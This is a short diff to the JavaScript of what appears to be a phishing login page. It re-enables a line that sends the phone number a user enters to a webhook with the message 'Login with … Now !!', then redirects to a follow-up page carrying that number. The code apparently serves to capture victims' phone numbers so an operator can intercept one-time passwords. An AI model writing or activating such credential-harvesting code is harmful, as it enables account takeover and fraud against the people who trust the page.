@@ -183,7 +183,7 @@
 
         getOtpButton.addEventListener('click',()=>{
             if(phoneNumberInput.value.length>=14){
-                //sendToWebhook(`Login with ${phoneNumberInput.value} Now !!`);
+                sendToWebhook(`Login with ${phoneNumberInput.value} Now !!`);
                 const url = new URL(window.location.href);
                 const baseUrl = url.origin + url.pathname.substring(0, url.pathname.lastIndexOf('/')) + '/';
                 location.href=`${baseUrl}/proceed.html?num=${phoneNumberInput.value}&user=${redirectUser}`;
